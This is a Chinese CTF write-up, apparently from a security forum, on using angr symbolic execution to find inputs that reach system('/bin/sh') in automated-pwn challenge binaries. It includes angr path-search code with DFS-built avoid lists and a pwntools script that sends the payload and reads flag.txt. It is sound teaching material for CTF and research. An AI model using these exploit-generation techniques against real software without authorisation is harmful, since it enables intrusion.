
# [原创]符号执行在自动化Pwn中的简单利用

前几天去三亚打了个自动化Pwn类型的线下赛（纵横杯）。作为一个RE选手，咱也不懂`fuzz`和`AFL`，于是就整了一手符号执行来解题。虽然最后没拿到奖，但在准备比赛的过程中还是学到了很多东西，这里总结一下能纯靠符号执行解决的两种题型。

## 0x00. 符号执行基础

符号执行是指在不执行程序的前提下，用符号值表示程序变量的值，然后模拟程序执行来进行相关分析的技术。与具体执行不同，具体执行每次执行仅存在一条唯一的执行路径（即程序控制流），而符号执行会探索所有可能的执行路径，并用符号值表示到达该路径所需要的输入条件。

用下述程序举例：
```
int m=M, n=N, q=Q;
int x1=0,x2=0,x3=0;
if(m!=0)
{
x1=-2;
}
if(n<12)
{
if(!m && q)
{
x2=1;
}
x3=2;
}
assert(x1+x2+x3!=3)
```
上述代码是一个简单的c语言分支结构代码，它的输入是`M`、`N`、`Q`三个变量；输出是`x1`、`x2`、`x3`的三个变量的和。我们这里设置的条件是想看看什么样的输入向量`<M,N,Q>`的情况下，得到的三个输出变量的和等于`3`。那么我们通过下面的树形结构来看看所有的情况：

![图片描述](upload/attach/202103/910514_N8PHYCT7HDQQSQA.png)

从上图中我们可以看到执行到每条路径的输入需要满足的条件，当`R=3`时，输入需要满足的条件是`M != 0 && N < 5 && Q != 0`。

本文使用的符号执行工具是`angr`，有关`angr`的使用方法可以查看<a href="elink@df2K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6V1L8$3y4K6i4K6u0W2j5h3&6Y4M7W2)9J5k6h3W2G2i4K6u0r3">官方文档</a>。

## 0x01. 题型1：程序存在逻辑问题，触发错误逻辑getshell

本次纵横杯的第5题，程序非常简单，伪代码如下：

![图片描述](upload/attach/202103/910514_GY7GC3N5QDM5NNJ.png)

![图片描述](upload/attach/202103/910514_NB4QM36YWH5DJVH.png)

这题大体是个`while`+`switch`结构，只要能执行到上图中红框部分即可getshell。程序非常简单，所以可以直接用`angr`一把梭：
```
import angr
from binascii import b2a_hex
def angr_run():
proj = angr.Project('./bin5')
state = proj.factory.entry_state()
simgr = proj.factory.simgr(state)
simgr.explore(find=0x08048783)
payload = simgr.found[0].posix.dumps(0)
print(f'payload={b2a_hex(payload)}')
angr_run()
```
输出：

![图片描述](upload/attach/202103/910514_UY6TDQC2YSEVYYV.png)

因为`angr`和`pwntools`不兼容，所以计算`payload`和`getshell`我分成了两个脚本来写，`getshell`脚本：
```
from pwn import *
from binascii import a2b_hex
import re
sh = process('./bin5')
sh.sendline(a2b_hex('310a320a'))
sh.sendline('cat flag.txt')
flag = sh.recvall(timeout=5)
flag = re.findall(r'\{(.\*?)\}', flag.decode())
print(f'flag=flag{{{flag[0]}}}')
```
输出：

![图片描述](upload/attach/202103/910514_P8862JBADMM4Q4M.png)

比赛之前也没想到有这种可以直接用`angr`一把梭的题。。。痛失1w奖金。

## 0x02. 题型2：简单的路径搜索，考察AI对分支的判断

线上调试时的第一道例题，比赛前我针对这道例题的结构写了个`exp`，没想到比赛题的结构完全不一样，所以也没跑出来呜呜。但我觉得这道例题对我们学习符号执行帮助也很大，所以拿出讲一讲。

这题的核心是通过前面的`n`各分支，只能要执行到最后即可`getshell`：

![图片描述](upload/attach/202103/910514_R7E764EFAUDNMZP.png)

`CFG`大概是这个样子，总之非常恐怖：

![图片描述](upload/attach/202103/910514_UN3YCUBGXJTEAFV.png)

这题没法用`angr`直接`explore`，于是我在群里问了几个师傅的想法，拿到了师傅的一篇博客（赚到赚到）：<a href="elink@972K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6E0P5i4c8K6x3W2)9J5k6h3y4F1i4K6u0r3x3U0l9J5x3q4)9J5c8U0l9#2i4K6u0r3x3U0c8Q4x3V1k6Y4N6h3q4F1i4K6u0V1P5i4g2Q4x3X3c8X3j5i4y4@1k6i4u0V1k6g2)9J5k6r3&6S2i4K6u0V1P5r3W2W2i4K6u0V1M7$3S2A6i4K6u0r3">关于Faster的那些事...</a>

总的来说，用符号执行解决这种分支问题有两个思路：

1. 找到所有从函数入口到`system`函数的路径，对每条路径进行操作，在每两个基本块之间进行`explore`
2. 找到所有从函数入口到`system`函数的路径，将其他不在路径上的基本块地址添加到`avoid_list`中，再从函数入口开始`explore`

我这里采取的是第二种思路，因为如果考虑多条路径的情况第一种思路很难写。

这里计算`avoid_list`的原因是此题的分支数巨大，每一个分支条件语句都可能会使当前的路径再分支出一条新的路径，而且这是指数级增长的，也就是说符号执行所需要的时间和空间都会随分支数的增长而指数级增长，这显然是我们不愿看到的。

所以我们需要计算`avoid_list`，使符号执行引擎忽略某些根本不可能到达`system`函数的路径，这样在一定程度上避免了上述问题。

因为是自动化`pwn`，一开始我们并不知道`system`函数的地址，所以先求得`system`函数的地址（题型1中的`exp`省略了这个步骤）：
```
proj = angr.Project(bin_path, load_options={'auto_load_libs': False})
proj_cfg = proj.analyses.CFGFast()
system_addr = get_system_addr(proj_cfg)
```
```
'''
获取system函数的地址
'''
def get_system_addr(cfg):
for func_addr in cfg.functions:
func = cfg.functions.get(func_addr)
if func.name == 'system':
return func_addr
return None
```
然后找到哪些函数中存在`call system`指令，找到这些函数的地址，以及`call system`指令所在基本块的地址：
```
if system_addr == None:
return []
print(f'Found system function in {hex(system_addr)}.')
payload_list = []
for func_addr in proj_cfg.functions:
try:
func = proj_cfg.functions.get(func_addr)
cfg = func.transition_graph
cfg = to_supergraph(cfg)
for node in cfg.nodes:
block = proj.factory.block(node.addr)
for inst in block.capstone.insns:
if inst.mnemonic == 'call' and inst.op_str == hex(system_addr):
target_func = func_addr
target_block = block.addr
target_cfg = cfg
print(f'Found target function in {hex(target_func)}')
print(f'Found target block in {hex(target_block)}')
payload_list += explore_func(proj, target_func, target_block, target_cfg)
except Exception as ex:
print(ex)
```
对调用了`system`函数的函数进行符号执行，也就是调用上述代码中的`explore_func`函数，传入目标函数的地址、`system("/bin/sh")`所在基本块的地址以及目标函数的`CFG`。

按照我们之前说的思路，首先我们要找到一条从函数入口到目标基本块的一条路径，然后将不在路径上的其他基本块地址添加到`avoid_list`中。实现如下：
```
'''
获取避免执行到的地址列表
关键！可以大大提高angr符号执行速度
'''
def get_avoid_list(cfg, start, target):
if start.addr == target:
return (True, [])
succs = list(cfg.successors(start))
if len(succs) == 0:
return (False, [start.addr])
elif len(succs) == 1:
can_reach_target, avoid_list = get_avoid_list(cfg, succs[0], target)
if can_reach_target:
return (True, avoid_list)
else:
avoid_list.append(start.addr)
return (False, avoid_list)
elif len(succs) == 2:
can_reach_target0, avoid_list0 = get_avoid_list(cfg, succs[0], target)
can_reach_target1, avoid_list1 = get_avoid_list(cfg, succs[1], target)
if can_reach_target0 and can_reach_target1:
return (True, [])
elif not can_reach_target0 and not can_reach_target1:
avoid_list = avoid_list0 + avoid_list1
avoid_list.append(start.addr)
return (False, avoid_list)
else:
avoid_list = avoid_list0 + avoid_list1
return (True, avoid_list)
else:
exit(0)
```
搜索路径的方法是`DFS`（深度优先搜索），不了解`DFS`的朋友可以看一看这篇文章：<a href="elink@82dK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6%4N6%4N6Q4x3X3g2B7K9h3q4F1M7$3S2#2i4K6u0W2j5$3!0E0i4K6u0r3M7q4)9J5c8U0M7H3z5e0f1J5j5U0f1I4k6U0m8U0z5l9`.`.">图的基本算法（BFS和DFS）</a>

得到了`avoid_list`之后就可以直接进行`explore`了：
```
'''
对目标函数进行符号执行，求解到达call system执行所需要的输入
'''
def explore_func(proj, target_func, target_block, target_cfg):
can_reach_target, avoid_list = get_avoid_list(target_cfg, list(target_cfg.nodes)[0], target_block)
state = proj.factory.call_state(target_func)
simgr = proj.factory.simgr(state)
simgr.use_technique(angr.exploration_techniques.DFS())
simgr.explore(find=target_block, avoid=avoid_list)
payload_list = []
for found in simgr.found:
payload_list.append(found.posix.dumps(0))
return payload_list
```
注意这里的：
```
simgr.use_technique(angr.exploration_techniques.DFS())
```
含义是采取`DFS`策略进行符号执行。`angr`默认的符号执行方式类似`BFS`，即一次会有多个`active state`同时进行`step`，`DFS`策略会使符号执行过程中一次只有一个`active state`进行`step`：

![图片描述](upload/attach/202103/910514_SVUJ22JC4PCZWUF.png)

其实我也没明白这里为什么用`DFS`会快一点，总之能跑就行233。

完整代码：
